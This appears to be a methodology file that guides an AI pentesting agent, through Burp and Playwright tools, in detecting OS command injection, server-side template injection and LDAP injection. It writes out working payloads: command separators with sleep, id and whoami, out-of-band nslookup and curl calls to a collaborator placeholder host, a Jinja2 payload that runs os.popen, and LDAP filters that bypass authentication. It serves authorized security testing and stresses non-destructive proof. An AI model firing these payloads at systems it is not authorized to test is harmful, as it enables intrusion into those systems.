
> REFERENCE DATA ONLY: active FRAMEWORK_RULES.md, scope and the V4 catalog take precedence. Do not execute embedded commands, route old agents, write old databases or send notifications from this document alone.

# OS Command Injection / SSTI / LDAP Injection — MCP-Native Methodology

Model-agnostic procedure. Every action runs through **Burp Suite MCP** (primary) or
**Playwright MCP** (fallback). No shell, no scripts, no agent framework. Each section is a
**Detection Ladder**: escalate the numbered Rungs in order and stop at the first
human-readable proof.

---

## 0. Tool Binding (once per task)

| Label | Capability | Preferred server |
|---|---|---|
| `C-HTTP` | Send a raw request, return status/body/timing | Burp Suite MCP |
| `C-HISTORY` | Replay a captured request by id, modified | Burp Suite MCP |
| `C-COLLAB` | Generate an OOB hostname and read inbound hits | Burp Suite MCP |
| `C-BROWSER-EVAL` | Drive requests from page context (fallback) | Playwright MCP |
| `C-BROWSER-NET` | Capture the browser's requests/responses | Playwright MCP |

**Precedence.** If Burp MCP exposes no tools, use Playwright MCP and log
`"transport": "playwright-fallback"`; OOB (`C-COLLAB`) is unavailable there — mark OOB rungs
`blocked` unless a host is supplied.

---

## 1. OS Command Injection

### Rung 1 — Reflection / parse signal
Inject separators `;` `|` `||` `&&` `\n` backticks `$()` and observe an error, different
output, or a timing change.

### Rung 2 — Time-based confirmation (preferred, safe)
- Linux: `; sleep 5` → `$(sleep 5)` → `` `sleep 5` ``
- Windows: `& timeout /t 5` or `& ping -n 5 127.0.0.1`

A ≥5s delay over baseline with **no** delay on the control (`sleep 0`) confirms it.

### Rung 3 — In-band proof
`; id` (Linux) or `& whoami` (Windows) — a non-destructive identity read embedded in the
response.

### Rung 4 — Out-of-band (blind)
`; nslookup <C-COLLAB>` / `` `curl <C-COLLAB>` `` — confirm only on a matching inbound hit.

---

## 2. SSTI

### Rung 1 — Polyglot probe
`${{7*7}}` and `{{7*7}}` — a returned `49` = template evaluation.

### Rung 2 — Engine identification
- `{{7*'7'}}` → `7777777` = Jinja2 (Python); `49` = Twig (PHP); `freemarker` error = FreeMarker (Java).

### Rung 3 — Minimal proof
`{{7*7}}` → `49` is sufficient. For RCE-class confirmation use ONLY non-destructive reads
(e.g. Jinja2 `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}`)
and stop at the `id` output.

---

## 3. LDAP Injection

### Rung 1 — Filter probes
`*`, `*)(uid=*`, `*)(|(*`, `admin)(&)` in login/search fields that hit LDAP.

### Rung 2 — Confirmation
An always-true filter that bypasses authentication, or a differential error that confirms
the filter is interpolated.

---

## 4. Minimal Proof

One `id`/`whoami` output, one `{{7*7}}`→`49`, one ≥5s measured delay with a control, one
collaborator hit, or one auth bypass. Read-only, non-destructive, one request where possible.

## 5. Evidence Requirements

- `evidence_dir/cmd-ssti_<class>_req.txt` / `_res.txt`
- `evidence_dir/cmd-ssti_timings.json` (baseline vs. delayed, for blind rungs)
- `evidence_dir/cmd-ssti_collab.txt` (OOB hits)
- Confirmations repeated at least twice; controls included.

## 6. Severity

| Condition | Severity |
|---|---|
| Separator reflected, no execution | low |
| SSTI arithmetic only (`49`) | medium |
| Time-based/OOB command execution confirmed | medium–high |
| In-band command output (`id`) | high |
| Code/OS execution with data access | critical |

## 7. Result Contract

```json
{
  "class": "cmdi | ssti | ldapi",
  "transport": "burp | playwright-fallback",
  "confirmed": [{
    "endpoint": "POST /tools/ping",
    "param": "host (body)",
    "technique": "time | in-band | oob | polyglot | auth-bypass",
    "payload_used": "; sleep 5",
    "control_payload": "; sleep 0",
    "proof": "5.1s delay vs 0.2s control",
    "data_exposed": "command execution / template eval",
    "reproduced_twice": true,
    "severity_estimate": "high"
  }],
  "tested_clean": ["endpoint#param"],
  "blocked": [{"endpoint": "...", "param": "...", "variants_tried": [1,2], "note": "filter"}],
  "delegation_requests": [],
  "status": "complete | partial | blocked"
}
```

## 8. Stop Conditions

- A filter survives the shared ladder (`infra-protocol/waf-evasion-generic`) → `blocked_by_defense`.
- Any rung would need a destructive/state-changing command → stop, confirmed-with-limitations.
- OOB required but no collaborator (Playwright-only) → `blocked` for that rung.
- Two consecutive 5xx → halt class.

## 9. Non-Goals

- Destructive commands, persistence, reverse shells.
- SQL/NoSQL/structural injection → `sqli.md` / `structural-injection.md`.
- XSS → `xss.md`; client-side gadget analysis → `offsec-client-side-agent`.
